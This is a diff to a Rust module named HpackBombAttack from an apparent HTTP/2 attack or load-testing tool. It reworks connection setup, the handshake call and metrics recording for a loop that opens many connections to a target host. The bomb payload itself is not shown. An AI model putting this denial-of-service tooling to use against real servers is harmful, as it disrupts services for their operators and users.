@@ -15,10 +15,12 @@
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
+use async_trait::async_trait;
 use bytes::Bytes;
 use phoenix_core::RawH2Connection;
 use phoenix_metrics::AttackMetrics;
 use tracing::{info, warn, error};
+use url::Url;
 
 use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};
 
@@ -230,8 +232,17 @@ impl Attack for HpackBombAttack {
                 let mut conn_requests = 0u64;
                 let mut conn_errors = 0u64;
                 
-                // Connect to target
-                let mut connection = match RawH2Connection::connect(&target_host, target_port).await {
+                // Connect to target - construct URL from host and port
+                let url_str = format!("https://{}:{}", target_host, target_port);
+                let url = match Url::parse(&url_str) {
+                    Ok(url) => url,
+                    Err(e) => {
+                        error!("Invalid URL for connection {}: {}", conn_idx, e);
+                        return (0, 1);
+                    }
+                };
+                
+                let mut connection = match RawH2Connection::connect(&url).await {
                     Ok(conn) => conn,
                     Err(e) => {
                         error!("Connection {} failed: {}", conn_idx, e);
@@ -240,7 +251,7 @@ impl Attack for HpackBombAttack {
                 };
                 
                 // Perform handshake
-                if let Err(e) = connection.handshake().await {
+                if let Err(e) = connection.perform_handshake().await {
                     error!("Connection {} handshake failed: {}", conn_idx, e);
                     return (0, 1);
                 }
@@ -270,7 +281,7 @@ impl Attack for HpackBombAttack {
                     }
                     
                     conn_requests += 1;
-                    metrics.increment_requests();
+                    metrics.record_request(0, true, 0).await;
                     
                     // Small yield
                     if conn_requests % 100 == 0 {
@@ -299,7 +310,7 @@ impl Attack for HpackBombAttack {
         }
         
         let actual_duration = start_time.elapsed();
-        let snapshot = metrics.snapshot();
+        let snapshot = metrics.snapshot().await;
         
         info!("Attack completed: {} requests, {} errors, duration: {:?}", 
               total_requests, errors, actual_duration);
